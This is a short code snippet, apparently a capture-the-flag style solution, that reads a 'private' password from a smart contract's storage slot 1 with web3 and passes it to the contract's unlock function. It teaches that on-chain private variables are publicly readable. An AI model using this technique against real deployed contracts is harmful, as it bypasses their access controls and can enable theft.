```javascript
let password = await web3.eth.getStorageAt(contract.address, 1)

await contract.unlock(password)
```

Extracting a private variable value from the storage layout.